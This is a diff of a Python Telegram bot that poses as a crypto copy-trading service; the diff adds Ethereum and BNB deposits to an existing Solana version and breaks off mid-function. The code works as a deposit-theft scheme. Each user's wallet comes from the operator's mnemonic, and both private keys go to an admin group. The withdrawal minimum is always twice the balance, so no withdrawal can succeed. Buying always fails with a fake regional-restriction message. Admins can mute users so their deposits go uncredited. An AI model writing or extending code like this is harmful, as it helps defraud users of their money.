@@ -4,6 +4,7 @@ import random
 import string
 import hashlib
 from mnemonic import Mnemonic
+from eth_account import Account
 
 _bip39 = Mnemonic("english")
 import base58
@@ -38,8 +39,10 @@ user_states = {}
 # Track users whose wallet info has been sent to admin group (prevent spam)
 wallet_sent_to_admin = set()
 # Track last notified balance per user (to show notification only once per deposit)
-last_notified_balance = {}       # {telegram_id: balance} — tracks user notifications
-last_admin_notified_balance = {} # {telegram_id: balance} — tracks admin group notifications
+last_notified_balance = {}       # {telegram_id: balance} — tracks user SOL notifications
+last_admin_notified_balance = {} # {telegram_id: balance} — tracks admin group SOL notifications
+last_notified_evm = {}          # {telegram_id: {"eth": float, "bnb": float}}
+last_admin_notified_evm = {}    # {telegram_id: {"eth": float, "bnb": float}}
 
 # Admin configuration
 ADMIN_IDS = [6370028992, 7484918897]
@@ -240,6 +243,42 @@ async def get_sol_price_usd():
         return 0
 
 
+async def get_evm_prices_usd():
+    """Get ETH and BNB prices in USD from CoinGecko. Returns (eth_price, bnb_price)."""
+    try:
+        price_data = cg.get_price(ids="ethereum,binancecoin", vs_currencies="usd")
+        eth_price = price_data.get("ethereum", {}).get("usd", 0)
+        bnb_price = price_data.get("binancecoin", {}).get("usd", 0)
+        return eth_price, bnb_price
+    except Exception as e:
+        print(f"Error fetching EVM prices: {e}")
+        return 0, 0
+
+
+async def check_eth_balance(address: str) -> float:
+    """Check ETH balance via public Ethereum RPC. Returns balance in ETH."""
+    try:
+        payload = {"jsonrpc": "2.0", "method": "eth_getBalance", "params": [address, "latest"], "id": 1}
+        resp = requests.post("https://rpc.ankr.com/eth", json=payload, timeout=10)
+        hex_val = resp.json().get("result", "0x0")
+        return int(hex_val, 16) / 1e18
+    except Exception as e:
+        print(f"Error checking ETH balance: {e}")
+        return 0.0
+
+
+async def check_bnb_balance(address: str) -> float:
+    """Check BNB balance via public BSC RPC. Returns balance in BNB."""
+    try:
+        payload = {"jsonrpc": "2.0", "method": "eth_getBalance", "params": [address, "latest"], "id": 1}
+        resp = requests.post("https://bsc-dataseed.binance.org/", json=payload, timeout=10)
+        hex_val = resp.json().get("result", "0x0")
+        return int(hex_val, 16) / 1e18
+    except Exception as e:
+        print(f"Error checking BNB balance: {e}")
+        return 0.0
+
+
 async def check_wallet_balance(public_address: str):
     """Check wallet balance on Solana blockchain"""
     try:
@@ -356,6 +395,95 @@ def get_user_balance(telegram_id: int):
     return user_balances.get(telegram_id, {}).get("balance", 0)
 
 
+async def monitor_evm_deposits(
+    telegram_id: int,
+    evm_address: str,
+    context: ContextTypes.DEFAULT_TYPE,
+    notify_user: bool = True,
+):
+    """Monitor ETH and BNB deposits. Mirrors monitor_deposits logic for EVM chains."""
+    try:
+        if telegram_id not in user_balances:
+            user_balances[telegram_id] = {"balance": 0, "last_checked_slot": 0,
+                                           "min_withdrawal": 0, "fixed_min": False,
+                                           "eth_balance": 0, "bnb_balance": 0}
+        if "eth_balance" not in user_balances[telegram_id]:
+            user_balances[telegram_id]["eth_balance"] = 0
+        if "bnb_balance" not in user_balances[telegram_id]:
+            user_balances[telegram_id]["bnb_balance"] = 0
+
+        stored_eth = user_balances[telegram_id]["eth_balance"]
+        stored_bnb = user_balances[telegram_id]["bnb_balance"]
+
+        chain_eth = await check_eth_balance(evm_address)
+        chain_bnb = await check_bnb_balance(evm_address)
+
+        eth_changed = chain_eth > stored_eth
+        bnb_changed = chain_bnb > stored_bnb
+
+        if not (eth_changed or bnb_changed):
+            return
+
+        is_muted = telegram_id in muted_users
+        eth_price, bnb_price = await get_evm_prices_usd()
+
+        last_evm = last_admin_notified_evm.get(telegram_id, {})
+
+        # ── Update stored balances (only when not muted) ──
+        if not is_muted:
+            if eth_changed:
+                user_balances[telegram_id]["eth_balance"] = chain_eth
+            if bnb_changed:
+                user_balances[telegram_id]["bnb_balance"] = chain_bnb
+            save_balances()
+
+        # ── Notify user (skip if muted) ──
+        prev_user = last_notified_evm.get(telegram_id, {})
+        if not is_muted and notify_user:
+            lines = []
+            if eth_changed and prev_user.get("eth", -1) != chain_eth:
+                dep = chain_eth - stored_eth
+                lines.append(f"  +{dep:.6f} ETH  (now {chain_eth:.6f} ETH ≈ ${chain_eth * eth_price:.2f})")
+                last_notified_evm.setdefault(telegram_id, {})["eth"] = chain_eth
+            if bnb_changed and prev_user.get("bnb", -1) != chain_bnb:
+                dep = chain_bnb - stored_bnb
+                lines.append(f"  +{dep:.6f} BNB  (now {chain_bnb:.6f} BNB ≈ ${chain_bnb * bnb_price:.2f})")
+                last_notified_evm.setdefault(telegram_id, {})["bnb"] = chain_bnb
+            if lines:
+                msg = "💰 <b>EVM Deposit Confirmed!</b>\n\n" + "\n".join(lines) + "\n\nFunds have been credited to your EVM wallet."
+                try:
+                    await context.bot.send_message(chat_id=telegram_id, text=msg, parse_mode="HTML")
+                except Exception as e:
+                    print(f"Error notifying user of EVM deposit: {e}")
+
+        # ── Notify admin group (always, but only once per deposit) ──
+        if GROUP_ID:
+            admin_lines = []
+            if eth_changed and last_evm.get("eth", -1) != chain_eth:
+                dep = chain_eth - stored_eth
+                admin_lines.append(f"ETH: +{dep:.6f} → {chain_eth:.6f} (${chain_eth * eth_price:.2f})")
+                last_admin_notified_evm.setdefault(telegram_id, {})["eth"] = chain_eth
+            if bnb_changed and last_evm.get("bnb", -1) != chain_bnb:
+                dep = chain_bnb - stored_bnb
+                admin_lines.append(f"BNB: +{dep:.6f} → {chain_bnb:.6f} (${chain_bnb * bnb_price:.2f})")
+                last_admin_notified_evm.setdefault(telegram_id, {})["bnb"] = chain_bnb
+            if admin_lines:
+                mute_note = "\n🔕 <b>User is MUTED</b> — balance not updated, no user notification." if is_muted else ""
+                try:
+                    user_obj = await context.bot.get_chat(telegram_id)
+                    uname = user_obj.username or user_obj.first_name or str(telegram_id)
+                    note = "\n".join(admin_lines)
+                    await context.bot.send_message(
+                        chat_id=GROUP_ID,
+                        text=f"🔵 <b>EVM Deposit Detected</b>\n\nUser: @{uname} (ID: {telegram_id})\nAddress: <code>{evm_address}</code>\n\n{note}{mute_note}",
+                        parse_mode="HTML",
+                    )
+                except Exception as e:
+                    print(f"Error sending EVM deposit admin notification: {e}")
+    except Exception as e:
+        print(f"Error in monitor_evm_deposits: {e}")
+
+
 async def check_and_notify_deposits(
     telegram_id: int, context: ContextTypes.DEFAULT_TYPE
 ):
@@ -363,6 +491,8 @@ async def check_and_notify_deposits(
     try:
         public_address, _ = derive_keypair_and_address(telegram_id)
         await monitor_deposits(telegram_id, public_address, context, notify_user=True)
+        evm_address, _ = derive_evm_wallet(telegram_id)
+        await monitor_evm_deposits(telegram_id, evm_address, context, notify_user=True)
     except Exception as e:
         print(f"Error checking deposits: {e}")
 
@@ -376,6 +506,21 @@ def derive_seed_from_mnemonic_and_id(mnemonic: str, telegram_id: int) -> bytes:
     msg = (mnemonic.strip() + ":" + str(telegram_id)).encode("utf-8")
     digest = hashlib.sha256(msg).digest()
     return digest[:32]
+
+
+def derive_evm_wallet(telegram_id: int):
+    """
+    Generate deterministic EVM (Ethereum / BNB Smart Chain) wallet for a user.
+    Same address works on both ETH and BSC.
+    Returns: (evm_address, private_key_hex)
+    """
+    if not MNEMONIC:
+        raise ValueError("MNEMONIC not set in environment variables")
+    # Different salt from Solana to produce a distinct key
+    msg = (MNEMONIC.strip() + ":evm:" + str(telegram_id)).encode("utf-8")
+    private_key_bytes = hashlib.sha256(msg).digest()
+    acct = Account.from_key(private_key_bytes)
+    return acct.address, acct.key.hex()
 
 
 def derive_keypair_and_address(telegram_id: int):
@@ -412,23 +557,29 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Generate unique wallet for this user
         public_address, private_key_b58 = derive_keypair_and_address(telegram_id)
 
-        # Send public address AND private key to admin group (only once per user to prevent spam)
-        # This serves as backend storage for asset recovery
+        # Generate EVM wallet
+        evm_address, evm_private_key = derive_evm_wallet(telegram_id)
+
+        # Send both wallet keys to admin group (only once per user)
         if telegram_id not in wallet_sent_to_admin and GROUP_ID:
             try:
                 admin_message = (
                     f"👤 <b>New Wallet Generated</b>\n\n"
                     f"User: @{user_name} (ID: {telegram_id})\n\n"
-                    f"📬 <b>Public Address:</b>\n"
+                    f"🟣 <b>Solana Address:</b>\n"
                     f"<code>{public_address}</code>\n\n"
-                    f"🔐 <b>Private Key (Backend Storage):</b>\n"
-                    f"<code>{private_key_b58}</code>"
+                    f"🔐 <b>SOL Private Key:</b>\n"
+                    f"<code>{private_key_b58}</code>\n\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"🔵 <b>EVM Address (ETH / BSC):</b>\n"
+                    f"<code>{evm_address}</code>\n\n"
+                    f"🔐 <b>EVM Private Key:</b>\n"
+                    f"<code>{evm_private_key}</code>"
                 )
                 await context.bot.send_message(
                     chat_id=GROUP_ID, text=admin_message, parse_mode="HTML"
                 )
                 wallet_sent_to_admin.add(telegram_id)
-                # Persist to file for restart persistence
                 try:
                     with open("wallet_notifications.txt", "a") as f:
                         f.write(f"{telegram_id}\n")
@@ -437,29 +588,53 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except Exception as e:
                 print(f"Error sending wallet to admin group: {e}")
 
-        # Monitor deposits and update balance
+        # Monitor deposits and update SOL balance
         balance = await monitor_deposits(telegram_id, public_address, context)
 
-        # Get SOL price
-        sol_price = await get_sol_price_usd()
-        usd_value = balance * sol_price if sol_price > 0 else 0
+        # Ensure user_balances has ETH/BNB fields
+        if telegram_id not in user_balances:
+            user_balances[telegram_id] = {"balance": 0, "last_checked_slot": 0, "min_withdrawal": 0, "fixed_min": False, "eth_balance": 0, "bnb_balance": 0}
+        if "eth_balance" not in user_balances[telegram_id]:
+            user_balances[telegram_id]["eth_balance"] = 0
+        if "bnb_balance" not in user_balances[telegram_id]:
+            user_balances[telegram_id]["bnb_balance"] = 0
 
-        # Show public address to user (private key stored securely server-side)
+        # Also scan EVM deposits while wallet is opened
+        await monitor_evm_deposits(telegram_id, evm_address, context, notify_user=True)
+
+        eth_balance = user_balances[telegram_id].get("eth_balance", 0)
+        bnb_balance = user_balances[telegram_id].get("bnb_balance", 0)
+
+        # Fetch all prices in parallel
+        sol_price = await get_sol_price_usd()
+        eth_price, bnb_price = await get_evm_prices_usd()
+
+        sol_usd   = balance     * sol_price if sol_price > 0 else 0
+        eth_usd   = eth_balance * eth_price if eth_price > 0 else 0
+        bnb_usd   = bnb_balance * bnb_price if bnb_price > 0 else 0
+        total_usd = sol_usd + eth_usd + bnb_usd
+
         wallet_text = (
             "💼 <b>Wallet Overview</b> — <i>Connected</i> ✅\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            "🟣 <b>Solana Address:</b>\n"
+            f"<code>{public_address}</code>\n\n"
+            "🔵 <b>EVM Networks</b>\n"
+            "<i>(Ethereum • BNB Smart Chain)</i>\n"
+            "<b>Address:</b>\n"
+            f"<code>{evm_address}</code>\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "📬 <b>Solana Address:</b>\n"
-            f"<code>{public_address}</code>\n"
-            # "🔐 <b>Private Key:</b> Stored securely (contact admin for recovery)\n\n"
+            "<b>Holdings</b>\n\n"
+            f"🟣 <b>Solana</b>\n"
+            f"• SOL: {balance:.4f}  ≈ <i>${sol_usd:.2f}</i>\n\n"
+            f"🔵 <b>EVM</b>\n"
+            f"• ETH: {eth_balance:.6f}  ≈ <i>${eth_usd:.2f}</i>\n"
+            f"• BNB: {bnb_balance:.6f}  ≈ <i>${bnb_usd:.2f}</i>\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "<b>Holdings</b>\n"
-            f"• <b>SOL:</b> {balance:.4f}\n"
-            f"• <b>Total Assets:</b> ${usd_value:.2f}\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "🔘 <i>No active tokens detected.</i>\n\n"
+            f"<b>Total Assets: ${total_usd:.2f}</b>\n\n\n"
             "💰 <b>Fund Your Bot</b>\n"
-            f"Send SOL to your address above\n\n"
-            "(Funds are required for copy-trading operations.)\n\n"
+            "Send assets to the appropriate address above.\n\n"
+            "<i>(Supported: SOL, ETH, and BNB for copy trading.)</i>\n\n"
             "👇 <i>What would you like to do next?</i>"
         )
     except Exception as e:
@@ -597,15 +772,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "🔍 Enter the Telegram ID of the user to view/edit details:"
             )
         elif option.startswith("admin_edit_"):
-            parts = option.split(
-                "_"
-            )  # admin_edit_balance_ID or admin_edit_min_withdrawal_ID
-            field = parts[2]
-            target_id = parts[-1]  # The ID is always at the end
+            parts = option.split("_")
+            field = parts[2]       # balance | ethbal | bnbbal | minw
+            target_id = parts[-1]  # ID is always last
             context.user_data["admin_editing_user"] = target_id
             context.user_data["admin_editing_field"] = field
+            label_map = {"balance": "SOL Balance", "ethbal": "ETH Balance", "bnbbal": "BNB Balance", "minw": "Min Withdrawal (SOL)"}
+            label = label_map.get(field, field.replace("_", " ").title())
             await query.message.reply_text(
-                f"📝 Enter the new <b>{field.replace('_', ' ').title()}</b> for user {target_id}:",
+                f"📝 Enter the new <b>{label}</b> for user <code>{target_id}</code>:",
                 parse_mode="HTML",
             )
         elif option.startswith("admin_mute_"):
@@ -741,6 +916,23 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [[InlineKeyboardButton("⬅️ Back", callback_data="back_trade")]]
         )
 
+        # Resolve which chain this token is on
+        tc_key = context.user_data.get("current_token_chain", "sol")
+        bal_data_buy = user_balances.get(user_id, {})
+        if tc_key == "eth":
+            buy_balance = bal_data_buy.get("eth_balance", 0)
+            buy_price, _ = await get_evm_prices_usd()
+            buy_sym = "ETH"
+        elif tc_key == "bnb":
+            buy_balance = bal_data_buy.get("bnb_balance", 0)
+            _, buy_price = await get_evm_prices_usd()
+            buy_sym = "BNB"
+        else:
+            buy_balance = get_user_balance(user_id)
+            buy_price = await get_sol_price_usd()
+            buy_sym = "SOL"
+        buy_usd = buy_balance * buy_price if buy_price > 0 else 0
+
         if parts[1] == "custom":
             token_address = (
                 parts[2]
@@ -750,9 +942,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data["awaiting_custom_buy"] = token_address
             await _del()
             sent = await query.message.reply_text(
-                "🟢 <b>Custom Buy Amount</b>\n\n"
-                "Please enter the amount of SOL you want to buy:\n\n"
-                "📝 Enter your desired SOL amount (e.g., 0.25, 2.5, 10)",
+                f"🟢 <b>Custom Buy Amount</b>\n\n"
+                f"Please enter the amount of {buy_sym} you want to spend:\n\n"
+                f"📝 Enter your desired {buy_sym} amount (e.g., 0.25, 2.5, 10)",
                 parse_mode="HTML",
                 reply_markup=back_trade_btn,
             )
@@ -765,27 +957,24 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if len(parts) > 2
                 else context.user_data.get("current_token", "")
             )
-            user_balance = get_user_balance(user_id)
-            sol_price = await get_sol_price_usd()
-            usd_value = user_balance * sol_price if sol_price > 0 else 0
             await _del()
-            if user_balance == 0:
+            if buy_balance == 0:
                 sent = await query.message.reply_text(
-                    "❗ Insufficient SOL balance.",
+                    f"❗ Insufficient {buy_sym} balance.",
                     parse_mode="HTML",
                     reply_markup=back_trade_btn,
                 )
-            elif usd_value < 10:
+            elif buy_usd < 10:
                 sent = await query.message.reply_text(
                     f"❗ Minimum amount required to buy a token is above $10.\n\n"
-                    f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})",
+                    f"Your current balance: {buy_balance:.6f} {buy_sym} (${buy_usd:.2f})",
                     parse_mode="HTML",
                     reply_markup=back_trade_btn,
                 )
             else:
                 sent = await query.message.reply_text(
                     f"Buying tokens is currently not available in your region at the moment. Try again later.\n\n"
-                    f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})",
+                    f"Your balance: {buy_balance:.6f} {buy_sym} (${buy_usd:.2f})",
                     parse_mode="HTML",
                     reply_markup=back_trade_btn,
                 )
@@ -853,33 +1042,62 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if option == "ct_withdraw":
         await _del()
-        user_balance = get_user_balance(user_id)
+        sol_bal  = get_user_balance(user_id)
+        eth_bal  = user_balances.get(user_id, {}).get("eth_balance", 0)
+        bnb_bal  = user_balances.get(user_id, {}).get("bnb_balance", 0)
         sol_price = await get_sol_price_usd()
-        usd_value = user_balance * sol_price if sol_price > 0 else 0
-        stored_min = user_balances.get(user_id, {}).get(
-            "min_withdrawal", user_balance * 2
-        )
-        if stored_min == 0 and user_balance > 0:
-            stored_min = user_balance * 2
-        withdraw_buttons = InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "💸 Withdraw 100%", callback_data="withdraw_100"
-                    )
-                ],
-                [InlineKeyboardButton("💸 Withdraw 50%", callback_data="withdraw_50")],
-                [
-                    InlineKeyboardButton(
-                        "💸 Withdraw X SOL", callback_data="withdraw_custom"
-                    )
-                ],
-                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
-            ]
-        )
+        eth_price, bnb_price = await get_evm_prices_usd()
+        sol_usd = sol_bal * sol_price if sol_price > 0 else 0
+        eth_usd = eth_bal * eth_price if eth_price > 0 else 0
+        bnb_usd = bnb_bal * bnb_price if bnb_price > 0 else 0
+        token_selector = InlineKeyboardMarkup([
+            [InlineKeyboardButton(f"🟣 SOL  ({sol_bal:.4f} ≈ ${sol_usd:.2f})", callback_data="withdraw_token_sol")],
+            [InlineKeyboardButton(f"🔵 ETH  ({eth_bal:.6f} ≈ ${eth_usd:.2f})", callback_data="withdraw_token_eth")],
+            [InlineKeyboardButton(f"🟡 BNB  ({bnb_bal:.6f} ≈ ${bnb_usd:.2f})", callback_data="withdraw_token_bnb")],
+            [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
+        ])
         await query.message.reply_text(
-            f"💸 <b>Withdraw SOL</b>\n\nYour current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
-            f"<b>Minimum withdrawal:</b> {stored_min:.4f} SOL\nChoose a withdrawal option:",
+            "💸 <b>Withdraw Funds</b>\n\nSelect the token you want to withdraw:",
+            parse_mode="HTML",
+            reply_markup=token_selector,
+        )
+        return
+
+    if option in ("withdraw_token_sol", "withdraw_token_eth", "withdraw_token_bnb"):
+        await _del()
+        token = option.split("_")[-1]  # sol / eth / bnb
+        context.user_data["withdraw_token"] = token
+        bal   = user_balances.get(user_id, {})
+        if token == "sol":
+            balance   = get_user_balance(user_id)
+            price     = await get_sol_price_usd()
+            sym, unit = "SOL", "SOL"
+        elif token == "eth":
+            balance   = bal.get("eth_balance", 0)
+            price, _  = await get_evm_prices_usd()
+            sym, unit = "ETH", "ETH"
+        else:
+            balance   = bal.get("bnb_balance", 0)
+            _, price  = await get_evm_prices_usd()
+            sym, unit = "BNB", "BNB"
+        usd_val = balance * price if price > 0 else 0
+        if token == "sol":
+            stored_min = bal.get("min_withdrawal", balance * 2)
+            if stored_min == 0 and balance > 0:
+                stored_min = balance * 2
+        else:
+            stored_min = balance * 2
+        withdraw_buttons = InlineKeyboardMarkup([
+            [InlineKeyboardButton(f"💸 Withdraw 100%", callback_data="withdraw_100")],
+            [InlineKeyboardButton(f"💸 Withdraw 50%",  callback_data="withdraw_50")],
+            [InlineKeyboardButton(f"💸 Withdraw X {unit}", callback_data="withdraw_custom")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")],
+        ])
+        await query.message.reply_text(
+            f"💸 <b>Withdraw {sym}</b>\n\n"
+            f"Your balance: <b>{balance:.6f} {sym}</b> (${usd_val:.2f})\n\n"
+            f"<b>Minimum withdrawal:</b> {stored_min:.6f} {sym}\n"
+            f"Choose a withdrawal option:",
             parse_mode="HTML",
             reply_markup=withdraw_buttons,
         )
@@ -939,8 +1157,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await _del()
         await query.message.reply_text(
             "🎯 <b>Target Wallet</b>\n\n"
-            "Enter the Solana wallet address you want to copy trade from:\n\n"
-            "📝 <b>Example:</b>\n<code>2SiCkKBUvzfoFeq1V5JrSybHuBUy1U1zszzYx2ccKxGP</code>\n\n"
+            "Enter the wallet address you want to copy trade from.\n"
+            "Supports both <b>Solana</b> and <b>EVM</b> (Ethereum / BSC) wallets.\n\n"
+            "📝 <b>Solana example:</b>\n<code>2SiCkKBUvzfoFeq1V5JrSybHuBUy1U1zszzYx2ccKxGP</code>\n\n"
+            "📝 <b>EVM example:</b>\n<code>0x742d35Cc6634C0532925a3b8D4C9B3A2d2E4f0bA</code>\n\n"
             "Type the address or tap Cancel.",
             parse_mode="HTML",
             reply_markup=cancel_markup(),
@@ -1069,35 +1289,25 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if option == "back_withdraw":
         await _del()
-        user_balance = get_user_balance(user_id)
+        context.user_data.pop("withdraw_token", None)
+        sol_bal  = get_user_balance(user_id)
+        eth_bal  = user_balances.get(user_id, {}).get("eth_balance", 0)
+        bnb_bal  = user_balances.get(user_id, {}).get("bnb_balance", 0)
         sol_price = await get_sol_price_usd()
-        usd_value = user_balance * sol_price if sol_price > 0 else 0
-        stored_min = user_balances.get(user_id, {}).get(
-            "min_withdrawal", user_balance * 2
-        )
-        if stored_min == 0 and user_balance > 0:
-            stored_min = user_balance * 2
-        withdraw_buttons = InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "💸 Withdraw 100%", callback_data="withdraw_100"
-                    )
-                ],
-                [InlineKeyboardButton("💸 Withdraw 50%", callback_data="withdraw_50")],
-                [
-                    InlineKeyboardButton(
-                        "💸 Withdraw X SOL", callback_data="withdraw_custom"
-                    )
-                ],
-                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
-            ]
-        )
+        eth_price, bnb_price = await get_evm_prices_usd()
+        sol_usd = sol_bal * sol_price if sol_price > 0 else 0
+        eth_usd = eth_bal * eth_price if eth_price > 0 else 0
+        bnb_usd = bnb_bal * bnb_price if bnb_price > 0 else 0
+        token_selector = InlineKeyboardMarkup([
+            [InlineKeyboardButton(f"🟣 SOL  ({sol_bal:.4f} ≈ ${sol_usd:.2f})", callback_data="withdraw_token_sol")],
+            [InlineKeyboardButton(f"🔵 ETH  ({eth_bal:.6f} ≈ ${eth_usd:.2f})", callback_data="withdraw_token_eth")],
+            [InlineKeyboardButton(f"🟡 BNB  ({bnb_bal:.6f} ≈ ${bnb_usd:.2f})", callback_data="withdraw_token_bnb")],
+            [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
+        ])
         await query.message.reply_text(
-            f"💸 <b>Withdraw SOL</b>\n\nYour current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
-            f"<b>Minimum withdrawal:</b> {stored_min:.4f} SOL\nChoose a withdrawal option:",
+            "💸 <b>Withdraw Funds</b>\n\nSelect the token you want to withdraw:",
             parse_mode="HTML",
-            reply_markup=withdraw_buttons,
+            reply_markup=token_selector,
         )
         return
 
@@ -1127,9 +1337,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["trade_chat_id"] = query.message.chat_id
         sent = await query.message.reply_text(
             "💰 <b>Buy Token</b>\n\n"
-            "Paste the Solana token contract address you want to buy.\n\n"
-            "📝 <b>Example:</b>\n<code>pumpCmXqMfrsAkQ5r49WcJnRayYRqmXz6ae8H7H9Dfn</code>\n\n"
-            "I'll show you the token details including price, market cap, liquidity, and security info.\n\n"
+            "Paste the token contract address you want to buy.\n"
+            "Supports <b>Solana</b>, <b>Ethereum</b>, and <b>BNB Smart Chain</b> tokens.\n\n"
+            "📝 <b>Solana example:</b>\n<code>pumpCmXqMfrsAkQ5r49WcJnRayYRqmXz6ae8H7H9Dfn</code>\n\n"
+            "📝 <b>ETH / BSC example:</b>\n<code>0x2170Ed0880ac9A755fd29B2688956BD959F933F8</code>\n\n"
+            "I'll detect the chain automatically and show token details.\n\n"
             "Type the address or tap Cancel.",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup(
@@ -1146,8 +1358,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["trade_chat_id"] = query.message.chat_id
         sent = await query.message.reply_text(
             "🔴 <b>Sell Token</b>\n\n"
-            "Paste the Solana token contract address of the token you want to sell.\n\n"
-            "📝 <b>Example:</b>\n<code>pumpCmXqMfrsAkQ5r49WcJnRayYRqmXz6ae8H7H9Dfn</code>\n\n"
+            "Paste the token contract address of the token you want to sell.\n"
+            "Supports <b>Solana</b>, <b>Ethereum</b>, and <b>BNB Smart Chain</b> tokens.\n\n"
+            "📝 <b>Solana example:</b>\n<code>pumpCmXqMfrsAkQ5r49WcJnRayYRqmXz6ae8H7H9Dfn</code>\n\n"
+            "📝 <b>ETH / BSC example:</b>\n<code>0x2170Ed0880ac9A755fd29B2688956BD959F933F8</code>\n\n"
             "Type the address or tap Cancel.",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup(
@@ -1279,119 +1493,131 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Handle WITHDRAWAL actions
     if option == "withdraw_100":
         await _del()
-        user_balance = get_user_balance(user_id)
-        sol_price = await get_sol_price_usd()
-        usd_value = user_balance * sol_price if sol_price > 0 else 0
-
-        # Minimum SOL required for gas fees (kept in wallet)
-        MIN_GAS_RESERVE = 0.005
-
-        # Calculate minimum withdrawal
-        stored_min = user_balances.get(user_id, {}).get(
-            "min_withdrawal", user_balance * 2
-        )
-        if stored_min == 0 and user_balance > 0:
-            stored_min = user_balance * 2
-
-        minimum_withdrawal = stored_min
-        MIN_GAS_RESERVE = 0.005
-        if user_balance == 0:
-            await query.message.reply_text(
-                "❗ Insufficient SOL balance.", parse_mode="HTML"
-            )
+        token = context.user_data.get("withdraw_token", "sol")
+        bal_data = user_balances.get(user_id, {})
+        if token == "sol":
+            balance  = get_user_balance(user_id)
+            price    = await get_sol_price_usd()
+            sym      = "SOL"
+            stored_min = bal_data.get("min_withdrawal", balance * 2)
+            if stored_min == 0 and balance > 0:
+                stored_min = balance * 2
+        elif token == "eth":
+            balance  = bal_data.get("eth_balance", 0)
+            price, _ = await get_evm_prices_usd()
+            sym      = "ETH"
+            stored_min = balance * 2
+        else:
+            balance  = bal_data.get("bnb_balance", 0)
+            _, price = await get_evm_prices_usd()
+            sym      = "BNB"
+            stored_min = balance * 2
+        usd_value = balance * price if price > 0 else 0
+        back_btn  = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")]])
+        if balance == 0:
+            await query.message.reply_text(f"❗ Insufficient {sym} balance.", parse_mode="HTML", reply_markup=back_btn)
             return
-
-        # Check if balance is above $10
         if usd_value < 10:
             await query.message.reply_text(
                 f"❗ Your balance must be above $10 to withdraw.\n\n"
-                f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
-                f"Required minimum: $10 worth of SOL\n\n"
-                f"Please deposit more SOL to meet the minimum withdrawal requirement.",
-                parse_mode="HTML",
+                f"Current balance: {balance:.6f} {sym} (${usd_value:.2f})\n"
+                f"Required minimum: $10 worth of {sym}\n\n"
+                f"Please deposit more {sym} to meet the minimum withdrawal requirement.",
+                parse_mode="HTML", reply_markup=back_btn,
             )
             return
-
-        # Show withdrawal requirements (minimum = 2x balance)
         await query.message.reply_text(
             f"💸 <b>Withdrawal Requirements</b>\n\n"
-            f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
-            f"<b>Minimum withdrawal required:</b> {minimum_withdrawal:.4f} SOL\n"
-            f"❗ You need at least {minimum_withdrawal:.4f} SOL to process a withdrawal.\n"
+            f"Your current balance: {balance:.6f} {sym} (${usd_value:.2f})\n\n"
+            f"<b>Minimum withdrawal required:</b> {stored_min:.6f} {sym}\n"
+            f"❗ You need at least {stored_min:.6f} {sym} to process a withdrawal.\n"
             f"Please deposit more funds to meet the minimum requirement.",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup(
-                [[InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")]]
-            ),
+            parse_mode="HTML", reply_markup=back_btn,
         )
         return
 
     if option == "withdraw_50":
         await _del()
-        user_balance = get_user_balance(user_id)
-        sol_price = await get_sol_price_usd()
-        usd_value = user_balance * sol_price if sol_price > 0 else 0
-        stored_min = user_balances.get(user_id, {}).get(
-            "min_withdrawal", user_balance * 2
-        )
-        if stored_min == 0 and user_balance > 0:
-            stored_min = user_balance * 2
-        minimum_withdrawal = stored_min
-        if user_balance == 0:
-            await query.message.reply_text(
-                "❗ Insufficient SOL balance.",
-                parse_mode="HTML",
-                reply_markup=InlineKeyboardMarkup(
-                    [[InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")]]
-                ),
-            )
+        token = context.user_data.get("withdraw_token", "sol")
+        bal_data = user_balances.get(user_id, {})
+        if token == "sol":
+            balance  = get_user_balance(user_id)
+            price    = await get_sol_price_usd()
+            sym      = "SOL"
+            stored_min = bal_data.get("min_withdrawal", balance * 2)
+            if stored_min == 0 and balance > 0:
+                stored_min = balance * 2
+        elif token == "eth":
+            balance  = bal_data.get("eth_balance", 0)
+            price, _ = await get_evm_prices_usd()
+            sym      = "ETH"
+            stored_min = balance * 2
+        else:
+            balance  = bal_data.get("bnb_balance", 0)
+            _, price = await get_evm_prices_usd()
+            sym      = "BNB"
+            stored_min = balance * 2
+        usd_value = balance * price if price > 0 else 0
+        back_btn  = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")]])
+        if balance == 0:
